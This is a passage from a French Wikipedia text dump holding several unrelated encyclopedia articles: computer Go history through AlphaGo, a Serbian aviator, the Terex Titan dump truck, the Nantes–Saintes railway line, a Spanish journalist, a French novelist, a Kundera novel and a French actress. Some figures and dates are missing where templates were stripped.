En 2008, grâce à une parallélisation efficace, MoGo a gagné une partie (sur trois) contre Catalin Taranu, professionnel, sur 9×9 avec des temps classiques (30 minutes pour chaque joueur). MoGo tournait sur un cluster fourni par Bull (32 nœuds avec 8 cœurs par nœud, chacun cadencé à ). La machine n'était pas disponible durant l'un des matchs perdus. MoGo a également joué une partie sur 19×19 contre Catalin Taranu et a perdu en dépit d'un avantage de 9 pierres de handicap. Cependant MoGo était en bonne position durant cette partie et a perdu à cause d'un mauvais choix lors d'un ko. La machine utilisée pour cet évènement (l'IAGO challenge, organisé par la société « Recitsproque ») était une bonne machine mais loin des meilleurs standards de l'industrie.
Le MoGo a gagné une partie sur 19×19 face à Kim MyungWan professionnel, avec MoGo ayant un avantage de 9 pierres de handicap. MoGo a gagné (de 0,5 point, mais cette victoire n'est pas si serrée qu'il y parait, le programme jouant la sécurité et perdant des points dès qu'il est certain de gagner). Kim MyungWan a utilisé environ 13 minutes de temps alors que MoGo en a utilisé environ 55, cependant il ne pense pas qu'utiliser plus de temps lui aurait permis de gagner. MoGo fonctionnait depuis les Pays-Bas sur un super ordinateur de 800 nœuds, chacun contenant 4 cœurs tournant à pour produire 15 Téraflops. MyungWan et MoGo ont joué un total de 4 parties à handicap et limite de temps variable, chacun en gagnant deux. Les enregistrements des parties sont accessibles sur le serveur de go KGS où Mogo a joué sous le pseudonyme MogoTitan.
En 2009, d'autres victoires contre des professionnels à des handicaps plus faibles (par des programmes tels que Crazy Stone) ont eu lieu ; de plus, Zen (programme médaille d'or aux olympiades de 2009) s'est classé de manière consistante entre 1 et 2 dan sur KGS.
Zen, en particulier, a connu ensuite une progression plus lente, mais régulière, l'amenant au début 2012 à un niveau de sur KGS, et même de en parties rapides ; lors d'un match-exhibition contre Takemiya Masaki, il a gagné successivement une partie à 5 pierres de handicap, puis une partie à 4 pierres.
AlphaGo et le "deep learning".
En , le programme AlphaGo développé par Google DeepMind, combinant plusieurs techniques notamment du "deep learning", a franchi une nouvelle étape que les experts pensaient ne pas pouvoir être atteinte avant de nombreuses années : il bat sans handicap Fan Hui, le meilleur joueur européen, professionnel , par le score de cinq victoires à zéro en parties lentes et trois à deux en parties rapides. 
En , il bat Lee Sedol, joueur , alors considéré comme un des meilleurs joueurs mondiaux, en remportant successivement les trois premières parties, puis la cinquième d'un match en cinq parties. Ce match est suivi en direct sur internet, et qualifié de moment historique.
Les performances d’AlphaGo amènent de nombreux programmeurs à tenter de développer des systèmes analogues ; ainsi, en , une version améliorée de Zen, Deep Zen, réussit à gagner une partie sur trois d’un match à égalité contre Cho Chikun.
Après des améliorations (corrigeant en particulier les faiblesses apparues lors du match contre Lee Sedol), AlphaGo bat, dans des parties rapides non officielles jouées début sur des serveurs chinois, quelques-uns des meilleurs joueurs mondiaux (Ke Jie, Iyama Yuta, Gu Li, etc.) sur le score stupéfiant de 60 victoires à zéro ; durant ce temps, JueYi, un programme chinois utilisant les algorithmes d'AlphaGo, parvient, avec des résultats tout de même un peu plus faibles, à atteindre en le niveau de sur le serveur FoxGo.
Développée en 2017 en n'utilisant aucune connaissance humaine mais uniquement à partir des règles du jeu et par auto-apprentissage, une nouvelle version, AlphaGo Zero, est encore plus compétente que les précédentes ; en décembre 2017, DeepMind en publie une version plus polyvalente encore, AlphaZero, capable de jouer également aux échecs et au shōgi à un niveau supérieur à celui des meilleurs humains ou programmes.
Après 2020, les meilleurs programmes (, Golaxy, etc.), tous développés en s’inspirant des algorithmes d’AlphaGo, rendent de manière consistante deux pierres de handicap aux meilleurs professionnels, ce qui correspondrait à un niveau de dan amateur et de 14 ou dan professionnel ; des programmes plus faibles (mais tout de même de la force des meilleurs professionnels), tels que Leela Zero ou Katago, développés par la communauté des joueurs, tournent sur des ordinateurs personnels et même sur des smartphones, permettant désormais à tous de s’entraîner dans des conditions encore inimaginables en 2018.

</doc>
<doc id="1872548" url="https://fr.wikipedia.org/wiki?curid=1872548" title="10 résolutions de Russel">
10 résolutions de Russel



</doc>
<doc id="1872552" url="https://fr.wikipedia.org/wiki?curid=1872552" title="Sava Mikic">
Sava Mikic

Sava Mikić, né le au Monténégro et mort en à Belgrade, est un avocat, homme politique, militaire, pilote et, héros de guerre serbe. 
Biographie.
Né au Monténégro, il est le deuxième fils d'une famille de paysans. Son grand frère quitte très vite l'école ce qui lui permet d'entreprendre des études à son tour. Très bon élève, il s'engage volontairement dans l'armée serbe durant la Première Guerre mondiale. Il a été un des pilotes pionniers de l'aviation serbe durant la guerre de 1914-1918, après avoir été élève pilote à l’école d’aviation de Chartres. Il a fait partie de ceux que l'on surnomme les « as de l'aviation ». Il a été décoré par Jacques Chaban-Delmas, maire de Bordeaux à l’époque, de la Légion d'honneur française pour son héroïsme sur le front de Salonique. Il épouse sa femme Ida (d'origine serbo-autrichienne) et s'installe avec elle dans la maison offerte par les parents d'Ida à leur fille à Belgrade, sur Topčidersko Brdo. Ils auront ensemble cinq enfants, dont deux mort-nés. Ses filles sont Milosava Mikic Coblentz, Ivanka Mikic Dalmas et Andjelica Mikic. Il écrit un ouvrage sur l'histoire de l'aviation yougoslave en 1933 : 'Istorija Jugoslovenskog Vazduhoplovstva' édité chez Drag. Gregorića
Très proche de la monarchie, il tient un rôle essentiel dans l'élaboration du putsch qui empêcha la Serbie de collaborer avec les Nazis. Il fut emprisonné trois fois durant la Seconde Guerre mondiale: d'abord par les Nazis qui l'ont violemment torturé, puis deux fois par les communistes de Tito qui lui reprochaient d'abord d'être monarchiste puis de ne pas être communiste. Il échappa in extrémis à son exécution, grâce au chef de la prison, dont il avait sauvé le fils d'une rafle des tchetniks, quelques années auparavant. Après ces terribles expériences, Sava Mikić cessa définitivement toute activité politique. Il fut traité comme un héros national et reçut de très nombreuses médailles militaires et honorifiques au cours de sa vie. Il meurt en à Belgrade, où il est enterré au cimetière "Topčidersko groblje".

</doc>
<doc id="1872555" url="https://fr.wikipedia.org/wiki?curid=1872555" title="Orcel">
Orcel



</doc>
<doc id="1872557" url="https://fr.wikipedia.org/wiki?curid=1872557" title="Terex 33-19 Titan">
Terex 33-19 Titan

Le Terex 33-19 Titan était un prototype de camion de transport canadien (un tombereau rigide), construit par Terex, à l'époque division de General Motors. Il avait une masse à vide de et une charge utile de . Il était alimenté par un moteur 16-cylindres de développant ( ou environ ), couplé à un générateur. Ce dernier alimentait quatre moteurs électriques à traction, situés sur chaque roue arrière. L'engin faisait de long et de haut. Construit en 1974 à l'usine GM de , il a subi douze mois de tests en Californie. En 1978, il fut assemblé à (Colombie-Britannique) pour . Il finit son service dans la en 1990, car devenu trop cher à exploiter. En 1994, en fit cadeau à la chambre de commerce de , qui l'a exposé dans la ville. Son moteur fut alors retiré. Aucun autre camion de cette taille ne vit le jour, en partie à cause des énormes tensions et efforts que doit subir le châssis.
Le tombereau Liebherr T 282B affiche une longueur inférieure () mais une charge utile plus élevée et un moteur plus puissant. À la différence du Terex 33-19 Titan, il n'est pas un prototype, mais un modèle commercial normal.

</doc>
<doc id="1872558" url="https://fr.wikipedia.org/wiki?curid=1872558" title="That 80's Show">
That 80's Show



</doc>
<doc id="1872561" url="https://fr.wikipedia.org/wiki?curid=1872561" title="Borgeaud">
Borgeaud



</doc>
<doc id="1872562" url="https://fr.wikipedia.org/wiki?curid=1872562" title="Ligne de Nantes-Orléans à Saintes">
Ligne de Nantes-Orléans à Saintes

La ligne de Nantes-Orléans à Saintes est une ligne ferroviaire française à écartement standard, reliant Nantes (Loire-Atlantique) à Saintes (Charente-Maritime), où elle rejoint la ligne de Chartres à Bordeaux-Saint-Jean, constituant ainsi une partie de la grande ligne transversale de la façade atlantique, entre la Bretagne et l'Aquitaine.
Initialement concédée à la Compagnie du chemin de fer Grand-Central, la ligne est construite dans les années 1860 sous quatre concessions attribuées l'une à la Compagnie d'Orléans, les autres à la Compagnie des Charentes. L'État rachète les concessions de la Compagnie des Charentes en 1877 et celle de la Compagnie d'Orléans en 1883.
Cette ligne porte le numéro du réseau ferré national.
Géographie.
Villes desservies.
Elle part de Nantes (gare d'Orléans) et passe à Clisson (Loire-Atlantique), La Roche-sur-Yon (Vendée), Luçon (Vendée), La Rochelle (Charente-Maritime) et Rochefort (Charente-Maritime) avant d'atteindre Saintes.
Relief et géologie.
Entre Luçon et La Rochelle, la ligne traverse une zone de terrains marécageux peu stables, qui ont nécessité des travaux de consolidations autour de 2020, avec une obligation de circulation à vitesse réduite (le temps de parcours de Nantes à Bordeaux (train Intercités) étant alors de 5 heures au lieu de 4).
Historique.
Voie ferroviaire de Nantes à La Roche-sur-Yon (années 1850).
Elle est d'abord concédée à la Compagnie du chemin de fer Grand-Central de France, mais celle-ci ayant fait faillite, la concession est réattribuée à différentes compagnies, dont la plus importantes est la Compagnie du chemin de fer de Paris à Orléans (Compagnie d'Orléans), qui détient déjà les lignes de Paris (gare d'Austerlitz, alors appelée gare d'Orléans) à Orléans, d'Orléans à Nantes (par Tours) et de Tours à Bordeaux. 
La Compagnie d'Orléans obtient la concession à titre définitif du tronçon de « Nantes à Napoléon-Vendée » (La Roche-sur-Yon) par une convention signée le avec le ministre des Travaux publics et approuvée par décret le .
La ligne Nantes-La Roche-sur-Yon est construite dans les années suivantes et sera achevée en 1866.
Voie de La Roche-sur-Yon à Saintes (années 1860).
En 1860, compte tenu des infrastructures existantes, le trajet ferroviaire pour aller de Nantes à Bordeaux passe donc par Tours, Poitiers et Angoulême. Cet itinéraire engendre des durées de voyage qui paraissent excessives. Les pouvoirs publics envisagent aussi de promouvoir un axe plus direct, le long du littoral atlantique, qui a aux yeux du gouvernement un intérêt stratégique, permettant d'achever l'axe Brest-Bayonne et d'assurer le déploiement rapide des forces armées en cas de conflit. Il s'agit en pratique de prolonger la ligne Nantes-La Roche-sur-Yon jusqu'à Coutras.
Les sections de La Roche-sur-Yon à La Rochelle et de Rochefort à Saintes, déclarées d'utilité publique par décret impérial du , sont concédées à la Compagnie des chemins de fer des Charentes (décret impérial du ). L'adjudication est approuvée par décret impérial le . Toutefois, la Compagnie du PO, soucieuse de préserver sa ligne phare Paris-Bordeaux, se montra réticente à concrétiser ce nouveau projet. Face à ce refus, l’État décida d’assumer seul le financement initial des travaux, allouant une somme de 22 millions de francs. Cependant, il revint rapidement sur cette décision et préféra confier la réalisation de l’ensemble du projet à un concessionnaire privé, moyennant un investissement total estimé à 64,1 millions de francs. Le tronçon La Roche-sur-Yon à La Rochelle, à lui seul, représentait un coût de 17,5 millions de francs.
Néanmoins, face à l'enjeu de ce projet d'envergure, le pouvoir concédant revint rapidement sur sa décision initiale et lança un appel d'offres public. Celui-ci portait sur un investissement global de 64,1 millions de francs, dont une part non négligeable de 17,5 millions était destinée au seul tronçon reliant La Roche-sur-Yon à La Rochelle. Une loi organique, promulguée le 11 juin 1862, vint encadrer de manière précise les modalités de réalisation de ces nouvelles lignes ferroviaires. Elle définissait ainsi les règles applicables en matière d'expropriation, de terrassements, d'ouvrages d'art et précisait la répartition des charges entre le pouvoir concédant et les futurs exploitants. Selon cette loi, le concessionnaire était tenu de financer l'infrastructure ferroviaire, tandis que l'État prenait en charge les aménagements des gares. Ainsi, sur le montant total de 64,1 millions de francs nécessaire à la réalisation des quatre lignes concédées, l'État s'engagea à verser une subvention de 20,495 millions de francs, répartie en seize versements semestriels à compter du 15 janvier 1864. Les offres furent déposées dès le 16 juin 1862 et, par une loi du 6 juillet suivant, le lot des quatre lignes fut adjugé aux fils de M. Guilhou jeune. Toutefois, ces derniers cédèrent rapidement leurs droits à une nouvelle compagnie ferroviaire, la Compagnie des Charentes, créée spécifiquement à cet effet. Fondée le 5 août 1862 et dotée de statuts approuvés par décret impérial le 30 mai 1863, cette compagnie présentait une particularité notable : si ses actionnaires majoritaires étaient des personnalités locales, notamment de grands négociants en eaux-de-vie de Cognac, son conseil d'administration était quant à lui entièrement composé de notables parisiens, pour la plupart des rentiers. La Compagnie des Charentes se trouva ainsi investie d'une lourde responsabilité : elle était tenue de lancer les travaux de construction dans l'année qui suivit l'attribution de la concession et de les mener à bien dans un délai maximal de huit ans.
La section de La Rochelle à Rochefort est concédée à titre éventuel à la Compagnie des chemins de fer des Charentes par une convention signée le entre le ministre des Travaux Publics et la compagnie. Cette convention est approuvée par un décret impérial à la même date. Cette section est déclarée d'utilité publique par décret impérial le rendant la concession définitive.
Mise en service de la ligne Nantes-Saintes (1866-1873).
La mise en service de la ligne s'échelonne en plusieurs phases, confiées à deux compagnies concessionnaires distinctes. La Compagnie d'Orléans inaugure le tronçon Nantes-La Roche-sur-Yon le 30 décembre 1866, dans le cadre d'un projet ambitieux visant à relier Nantes à Limoges via Chantonnay et Niort. La Compagnie des Charentes prend le relais, ouvrant successivement les sections Rochefort-Saintes le 15 avril 1867, La Roche-sur-Yon-La Rochelle le 14 mars 1871, et enfin La Rochelle-Rochefort le 29 décembre 1873.
Reprise de la ligne par les chemins de fer de l'État (1877 et 1883).
La Compagnie des Charentes, dès ses premières années d'exploitation, s'est trouvée confrontée à une concurrence acharnée de la part de la Compagnie d'Orléans (PO). Profitant du délai de construction de la ligne côtière, cette dernière a mis en œuvre une politique tarifaire particulièrement agressive, contraignant ainsi la Compagnie des Charentes à des conditions d'exploitation particulièrement onéreuses dans les gares communes de La Rochelle et de Rochefort. Ces contraintes ont poussé la Compagnie des Charentes à édifier ses propres infrastructures ferroviaires, alourdissant considérablement ses charges d'exploitation.
Le trafic de transit, loin d'atteindre les niveaux escomptés, s'est avéré décevant. La Compagnie des Charentes a ainsi peiné à équilibrer ses comptes, les recettes ne suffisant guère à couvrir les dépenses. Il est à noter qu'à cette époque, les liaisons ferroviaires entre Nantes et Bordeaux, malgré leur fréquence, étaient d'une lenteur extrême, avec des trains s'arrêtant dans toutes les gares intermédiaires. Une telle offre, peu attrayante, ne pouvait inciter les voyageurs à privilégier le rail.
Si le littoral sud de la Charente-Maritime, riche en stations balnéaires, a bénéficié d'un certain dynamisme touristique, il n'en allait pas de même pour le nord de ce département et le sud de la Vendée. Ces régions, à la densité de population faible et aux attraits touristiques limités, ont toujours souffert d'un trafic ferroviaire peu dense. Ces contraintes géographiques et économiques, qui perdurent encore de nos jours, expliquent en grande partie les difficultés rencontrées par les compagnies ferroviaires pour maintenir des dessertes régulières sur ces territoires. 
En 1877, l'État rachète le réseau de la Compagnie des Charentes par une convention signée entre le ministre des Travaux publics et la compagnie le et approuvée par une loi le . La ligne de La Roche-sur-Yon à Saintes est alors exploitée par l'administration des chemins de fer de l'État.
En 1883, la section de Nantes à La Roche-sur-Yon est reprise par l'État à la Compagnie d'Orléans par une convention signée entre le Ministre des travaux publics et la compagnie le et approuvée par une loi le suivant. L'exploitation est aussi reprise par l'administration des chemins de fer de l'État.
De l'aube du e aux années 1970.
Véritable artère ferroviaire, la ligne Nantes-Saintes constitue un axe de transit majeur entre le nord et le sud de la France, principalement destiné au transport de voyageurs. Si de nombreux trains relient directement les deux métropoles, l'offre est complétée par des liaisons longue distance, tant diurnes que nocturnes, assurant des correspondances entre l'Ouest, le Sud-Ouest et le Sud-Est de la nation. Ainsi, les villes de Brest et de Quimper sont notamment reliées à la Côte d'Azur par cet itinéraire.
Toutefois, le trafic local, particulièrement sur la portion septentrionale de cette ligne, demeure relativement modeste en raison de la faible densité de population des régions traversées.
De même, le transport de marchandises souffre de cette situation géographique. Les activités économiques, essentiellement agricoles, ne sont pas en mesure de générer des volumes de fret significatifs. Néanmoins, cet axe joue un rôle essentiel dans le transit de marchandises entre la Bretagne et le Sud-Ouest. Par ailleurs, certaines localités, telles que La Rochelle, concentrent une activité industrielle notable. À titre d'exemple, l'usine Talbot, desservie par une voie ferrée à Rompsay, expédie quotidiennement un ou deux trains complets de marchandises.
Déclin depuis les années 1980.
L'essor de l'automobile et des transports poids lourds à partir des années 1960, favorisé par le développement du réseau autoroutier, conduit à la marginalisation des lignes ferroviaires transversales. La ligne Nantes-Saintes n'a pas échappé à ce sort.
Le trafic omnibus local (arrêt à chaque gare), le plus vulnérable à cette évolution, est le premier à pâtir de cette situation. Dès le 28 septembre 1980, il est supprimé sur le tronçon La Roche-sur-Yon-La Rochelle . Simultanément toutes les gares situées entre Marans et La Rochelle sont fermées au service des voyageurs. Seuls subsistent les trains de transit (aujourd'hui nommés « Intercités ») reliant Nantes à Bordeaux, auxquels s'ajoutent quelques liaisons plus longues à destination de la Bretagne, de Toulouse ou de Marseille. 
La mise en service progressive d'une liaison autoroutière Nantes-Bordeaux par Niort à partir des années 1990, porte un coup aux liaisons ferroviaires sur le tronçon Nantes-La Rochelle. Face à un déficit d'exploitation croissant, la SNCF envisage de supprimer les liaisons directes entre les deux villes, à moins d'une intervention financière des régions concernées. Une telle mesure aurait eu pour conséquence de désaffecter complètement le tronçon La Roche-sur-Yon-La Rochelle, qui ne voit plus circuler que quelques trains quotidiens reliant Nantes à Bordeaux et quelques trains saisonniers destinés notamment aux pèlerinages vers Lourdes.
Quant au trafic de marchandises, il s'est quasiment éteint, notamment après l'arrêt de la desserte ferroviaire de la zone industrielle de Périgny-Rompsay et la fermeture de l'usine Triaxe. Le seul trafic régulier consiste en l'acheminement de porte-autos neufs depuis l'usine Citroën de La Janais, près de Rennes, jusqu'au triage ferroviaire de Bordeaux-Hourcade. Quelques trains de marchandises circulent occasionnellement entre Bordeaux et Nantes en passant par Saint-Pierre-des-Corps (près de Tours) et Poitiers.
Travaux de 2020-2021 sur le tronçon La Roche-sur-Yon-La Rochelle.
La ligne ferme entre La Rochelle et La Roche-sur-Yon du 6 janvier 2020 au 30 juillet 2021 pour permettre la modernisation d'une des deux voies et la dépose de l'autre.
En même temps, les gares de Luçon et de Marans deviennent des gares de croisement. 
Ces travaux prévus pour se terminer en mai 2021 prennent du retard à la suite de la pandémie de Covid-19.
Infrastructure.
À l'origine intégralement à double voie, cette ligne n'est plus exploitable que sur une seule voie, entre La Roche-sur-Yon et La Rochelle depuis les travaux de rénovation de 2021. La rénovation de la seconde voie est prévue, mais son calendrier n'est pas encore arrêté. Le profil en long de la ligne est moyen avec des déclivités maximum de 11 ‰. Son tracé sinueux ne permet qu'une vitesse maximale de 110 à 130 km/h selon les tronçons, ce qui pénalise lourdement l'attrait commercial de la ligne. Le temps de trajet direct Nantes-Bordeaux reste bloqué à plus de quatre heures, une durée voisine de celle en TGV via Paris. L'électrification complète ne s'est jamais non plus justifiée, la traction en rames diesel exploitant déjà le potentiel de la ligne à plein depuis les années 1960.
La section de Nantes à La Roche-sur-Yon est électrifiée en courant alternatif 25 kV - 50 Hz. Cette électrification est effective depuis le , à l'occasion du programme « Paris-Montparnasse - Les Sables-d'Olonne par TGV ». La section de La Roche-sur-Yon à Saintes reste non électrifiée et la traction diesel autonome est nécessaire. La gare de La Rochelle est également électrifiée avec ce même type de courant depuis le , dans le cadre de l'électrification de la ligne de Saint-Benoît à La Rochelle-Ville.
La sécurité des circulations des trains est assuré grâce au block automatique lumineux (BAL) entre Nantes et Clisson, au block automatique à permissivité restreinte (BAPR) entre Clisson et La Roche-sur-Yon depuis l’électrification, au BAPR de La Roche sur Yon à La Rochelle ville et au block manuel de double voie de type Nantes-Bordeaux (BMNB) entre La Rochelle ville et Saintes.
Le très mauvais état de la section La Roche-sur-Yon - La Rochelle a imposé l'abaissement de la vitesse maximale de 130 à à partir de . Entre 2020 et 2021, la desserte ferroviaire a été interrompue sur toute la section afin d'en rénover entièrement l'infrastructure : plateforme et rails d'une des deux voies, ouvrages d'art, signalisation, passages à niveau, rénovation complète et mise en accessibilité de la gare de Luçon. À Marans et Luçon, des évitements ont été créés pour préserver la possibilité de croisement des trains. Les travaux sont finis le 11 juillet 2021 et les trains pour la formation du personnel reprennent le lendemain à la vitesse d'origine, la reprise du service commercial étant prévue le 31 juillet.
Trafic.
TGV.
Cette ligne voit passer des TGV entre Nantes et La Roche-sur-Yon assurant la desserte entre Paris-Montparnasse et Les Sables-d'Olonne depuis le .
Intercités.
La ligne est parcourue dans son intégralité par des relations Intercités circulant entre Nantes et Bordeaux. Trois allers-retours quotidiens sont assurés entre ces deux villes ainsi qu'un aller-retour en semaine entre La Rochelle et Bordeaux. Certaines de ces relations étaient prolongées jusqu'à Quimper ou Toulouse et ont été supprimées au service horaire de .
Début 2020, l'État a procédé à un appel à candidatures pour l'exploitation de la ligne Intercités ; il est prévu au terme de celui-ci que l'offre sera portée à quatre allers-retours Nantes – Bordeaux minimum en 2022.
Épisodiquement, des trains de pèlerins pour Lourdes sont organisés au départ de La Roche-sur-Yon.
TER.
Depuis le , les TER circulent en traction électrique entre Nantes et La Roche-sur-Yon d'où une partie continue jusqu'aux Sables-d'Olonne. Certains TER continuent à être assurés en traction diesel : ceux allant vers Cholet à partir de Clisson, et ceux vers La Rochelle à partir de La Roche-sur-Yon.
Tram-train Nantes - Clisson.
Depuis le , la ligne est en partie exploitée de Nantes à Clisson sous la forme d'un service de tram-train. Au début de sa mise en service, celui-ci comptait trois allers-retours en plus des liaisons traditionnelles en TER. Depuis 2015, le tram-train assure l'intégralité de la desserte de Nantes à Clisson, les TER ne desservent plus les gares intermédiaires.
Réouvertures de points d'arrêts.
En 2011, une étude a été menée pour vérifier la pertinence de la réouverture de la gare de Marans au service des voyageurs dans le cadre d'une desserte péri-urbaine jusqu'à La Rochelle, à l'instar de la liaison entre La Rochelle et Rochefort, avec desserte de quelques gares intermédiaires qui seraient elles aussi rouvertes pour cette occasion.
En 2013, il a été envisagé de rouvrir les gares de Dompierre-sur-Mer et de Rompsay, sans qu'aucune échéance n'ait été fixée. Une réouverture des haltes entre Marans et La Rochelle est espérée à l'horizon 2023-2024.
Fret.
Plusieurs trains de fret pour le compte de Fret SNCF et Euro Cargo Rail (ECR) empruntent cette ligne. Outre des trains au départ de Nantes, on peut distinguer des trains en provenance de l'usine PRB de La Mothe-Achard sur la bretelle de La Roche-sur-Yon aux Sables-d'Olonne, transportant des poudres pour revêtements de façades à destination de Rognac, des trains en provenance du port de La Pallice soit d'hydrocarbures, soit de pâte à papier à destination des papeteries de Condat, ainsi qu'un trafic de céréales mis en place chaque été entre La Rochelle-Pallice et Marmande.

</doc>
<doc id="1872568" url="https://fr.wikipedia.org/wiki?curid=1872568" title="Perdix (genre)">
Perdix (genre)

Perdix est un genre d'oiseaux de la famille des Phasianidae.
Liste des espèces.
Selon , le genre "Perdix" est représenté par 3 espèces (ordre phylogénique) :

</doc>
<doc id="1872569" url="https://fr.wikipedia.org/wiki?curid=1872569" title="José Ortega Munilla">
José Ortega Munilla

José Ortega Munilla, né à Cárdenas (Cuba) le et mort le , est un écrivain et journaliste espagnol, père du philosophe José Ortega y Gasset.
Biographie.
José Ortega Munilla est le fils de José Ortega Zapata, originaire de Valladolid, et de María del Pilar Munilla Urquiza, née en Estrémadure. Son père est membre du Parti modéré, et exerce d'importantes fonctions dans l'administration coloniale cubaine ; il consacre cependant la plus grande partie de son temps au journalisme. La famille déménage à Madrid pendant l'enfance de José - ce dernier se considèrera toujours madrilène. Il commence ses études au petit séminaire, à Cuenca, puis à Gérone, et quitte cet établissement quand éclate la révolution de 1868, pour commencer des études de droit.
Il partage les opinions progressistes qui sont alors celle de la majorité de la jeunesse issue des milieux aisés. Il est rédacteur à "La Iberia", organe du parti de Práxedes Mateo Sagasta. Avec son ami Miguel Moya, Ortega Munilla fonde la revue littéraire "La Linterna" et publie également une revue consacrée à la tauromachie, El Chiclanero (revue). Son œuvre réaliste permet de le rattacher à la génération réaliste de 1868 ; de convictions positivistes, il est proche du krausisme sur le plan philosophique, et du naturalisme en littérature. Il rédige ensuite une chronique hebdomadaire dans " Los lunes de el imparcial" toujours publié de nos jours sous le titre "El Imparcial", qui était à l'origine celui de son supplément littéraire.
Le , il épouse une des filles d'Eduardo Gasset, le fondateur d’"El Imparcial", Dolores Gasset y Chinchilla. De leur mariage naissent quatre enfants : Eduardo, qui mourut en exil à Caracas, en , Rafaela, décédée en 1949, Manuel, auteur de la "Biographie d’El Imparcial", mort en , et enfin le philosophe José Ortega y Gasset, décédé en 1955. 
Lors des élections du 27 avril 1898, il devient député au Congrès des députés de la circonscription de Padrón. Il sera réélu, sans interruption, dans la même circonscription jusqu'aux élections du 8 mai 1910 (au total sept appels électoraux).
José Ortega Munilla est élu membre de la Real Academia Española en 1902 ; son discours de réception porte sur Ramón de Campoamor. Il travaille à la rubrique littéraire des "Lunes del Imparcial", puis au quotidien "El Imparcial", le plus prestigieux de son époque, dont il finit par prendre la direction. Il est l'un des directeurs de l'important groupe de presse bâti autour d’"El Imparcial", et soutient le quotidien "El Sol", sur lequel son fils José exerce une influence notable. Il fait de ses organes de presse des tremplins pour les écrivains de la génération de 1898, entre autres Azorín, Pío Baroja et Valle-Inclán, dont la notoriété commençait alors à se faire jour.

</doc>
<doc id="1872578" url="https://fr.wikipedia.org/wiki?curid=1872578" title="Lecteur CD">
Lecteur CD



</doc>
<doc id="1872580" url="https://fr.wikipedia.org/wiki?curid=1872580" title="Dominique Mainard">
Dominique Mainard

Dominique Mainard, née en 1967 à Paris, est une traductrice de romans anglais, nouvelliste et romancière française. Elle est lauréate du prix des libraires en 2009 pour son roman "Pour vous".
Biographie.
Dominique Mainard a grandi dans la région lyonnaise et séjourné cinq ans aux États-Unis.
Elle a publié des romans, des nouvelles, et a également traduit depuis l'anglais des auteurs tels Janet Frame ou John Cheever.
En 2008 elle publie son premier roman jeunesse "Ma vie en 17 pieds". Pour Martine Laval de "Télérama" : .
Œuvres.
Romans anglais, notamment des auteurs John Cheever et Janet Frame
Adaptation.
Alain Corneau a réalisé une adaptation cinématographique de "Leur histoire", avec Sergi López et Sylvie Testud, "Les Mots bleus" (2005).

</doc>
<doc id="1872582" url="https://fr.wikipedia.org/wiki?curid=1872582" title="Lecteur DVD">
Lecteur DVD



</doc>
<doc id="1872583" url="https://fr.wikipedia.org/wiki?curid=1872583" title="L'Ignorance">
L'Ignorance

L'Ignorance est un roman de Milan Kundera, écrit en français en 2000 et paru en France en 2003. Ce roman traite de l'histoire de deux Tchèques, Irena et Josef qui ont émigré en 1968, après l'échec du Printemps de Prague, et qui, une vingtaine d'années plus tard, y reviennent comme Ulysse revient dans son île après deux décennies d'Odyssée.
Résumé.
Quand la révolution de velours renverse le régime communiste tchécoslovaque, Iréna effectue à contrecœur un voyage à Prague pour revoir son pays. Là, elle retrouve Josef, un homme qui avait tenté de la séduire alors qu'elle vivait en Tchécoslovaquie. Lui-même, exilé au Danemark, est revenu pour quelques jours dans sa patrie natale.
À travers cette histoire, Kundera revient sur son expérience de la chute du communisme en Tchécoslovaquie et écrit un roman sur la nostalgie, questionnant la possibilité de ne pas vouloir rentrer dans le pays que l'on a fui. Par là, il s'interroge sur la vision homérique de l'exil et revient à de nombreuses reprises sur le personnage d'Ulysse, le « plus grand nostalgique » de tous les temps. Si la nostalgie est un sentiment obligatoire, nécessaire, pour les émigrés, il apparaît tel dans ce livre surtout aux yeux de la civilisation, alors que les émigrés eux-mêmes ne l'éprouvent pas fatalement.
Irena, le nouvel Ulysse féminin, un personnage kundérien.
L'intégration en France d'Irena est remise en cause par la parole de Sylvie qui l'incite à rentrer en Tchécoslovaquie.
De retour à Prague, Irena organise une soirée pendant laquelle elle espère raconter à ses amies sa vie d'émigrée, autour d'une dégustation de vin français. Elle a besoin de l'écoute et des questions de ses anciennes amies. En proposant du vin, elle se place en position d'étrangère afin d'obtenir la reconnaissance de ses proches, pour la personne qu'elle est devenue. Le refus de ses amies de boire du vin au profit de la bière tchèque montre que l'exil d'Irena n'a aucun intérêt pour elles. Irena se retrouve rattrapée par le passé celui d'avoir grandi sous l'emprise d'une mère narcissique qui a rendu le lien impossible entre famille, pays natal et amis.
La prise de conscience que plus rien ne la retient en Bohème et encore moins en France, Irena invite Josef à partir avec elle, vers un ailleurs, une destination inconnue. Irena envisage le départ comme une possibilité d'emprunter son propre chemin. Cependant, l'hôtel, cet espace de passage dans lequel elle se retrouve seule, reflète l'impermanence de son état et accentue l'idée de déracinement.

</doc>
<doc id="1872586" url="https://fr.wikipedia.org/wiki?curid=1872586" title="Permis automobile">
Permis automobile



</doc>
<doc id="1872588" url="https://fr.wikipedia.org/wiki?curid=1872588" title="As de l'aviation">
As de l'aviation



</doc>
<doc id="1872593" url="https://fr.wikipedia.org/wiki?curid=1872593" title="Taton">
Taton



</doc>
<doc id="1872595" url="https://fr.wikipedia.org/wiki?curid=1872595" title="Delphine Rollin">
Delphine Rollin

Delphine Rollin, née en à Carpentras, est une actrice française.
Biographie.
Delphine Rollin fait ses premiers pas au cinéma dès 1996 ("Le ciel est à nous"), mais c'est en 2002 dans "Une employée modèle" de Jacques Otmezguine aux côtés de François Berléand et François Morel, qu'elle se fait remarquer : elle est pré-sélectionnée dans la catégorie Espoir des "Césars" (2003). Elle joue aussi dans des téléfilms, notamment dans "Un paradis pour deux" (2002) de Pierre Sisser et "Le Choix de Myriam" (2009) de Malik Chibane et également dans des séries télévisées.
En 2014, elle participe à la série "RIS police scientifique", pour la dernière saison, dans le rôle du commandant Lucie Ballack qui devient le chef du groupe RIS. À partir de 2018, elle participe à la série "Plus belle la vie" avec le rôle de Delphine, l'ex-épouse de Clément Bommel.
Delphine Rollin joue aussi au théâtre dans la pièce "Le Tombeur", aux côtés de Michel Leeb, Guy Lecluyse, dans une mise en scène de Jean-Luc Moreau (2016).
Elle a également fait des apparitions dans des clips musicaux en 1999 – "Hors saison" de Francis Cabrel et "Peace and Tranquility to Earth" de Roudoudou – ainsi que dans des publicités françaises.

</doc>
<doc id="1872601" url="https://fr.wikipedia.org/wiki?curid=1872601" title="Louis Legrand (graveur, 1863-1951)">
Louis Legrand (graveur, 1863-1951)

Louis Auguste Mathieu Legrand est un peintre, dessinateur et graveur français né à Dijon le et mort à Livry-Gargan le 
Biographie.
